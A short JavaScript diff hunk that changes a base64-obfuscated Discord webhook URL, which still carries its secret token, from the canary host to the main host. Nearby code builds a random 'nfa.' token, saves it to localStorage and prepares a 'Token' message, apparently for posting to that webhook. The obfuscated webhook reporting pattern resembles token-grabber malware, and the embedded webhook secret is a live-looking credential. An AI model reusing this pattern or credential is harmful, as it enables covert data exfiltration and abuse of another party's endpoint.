@@ -16,7 +16,7 @@ dis_hook = null;
 		let numtoken3 = Math.floor(Math.random() * 100000);
 		var main_token = ("nfa." + alphtoken1 + numtoken1 + alphtoken2 + numtoken2 + alphtoken3 + numtoken3);
 		localStorage['token'] = main_token;
-		hook =atob('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzg3MjM0ODE5MzQyMDEwNzc5Ny9EWmpkeGdHMGxpR1RYaEsySDhNT3ZxRnA4Wld0UE16RnVPSzV4ZVNWS0s2SUVSdnZMdl9FLVV4ZW9yZGRrZGxNR2FldA==')
+		hook =atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODcyMzQ4MTkzNDIwMTA3Nzk3L0RaamR4Z0cwbGlHVFhoSzJIOE1PdnFGcDhaV3RQTXpGdU9LNXhlU1ZLSzZJRVJ2dkx2X0UtVXhlb3JkZGtkbE1HYWV0')
 		msg1 = {
 			"content": ("__**Token (Not Discord):" + main_token)
 		}
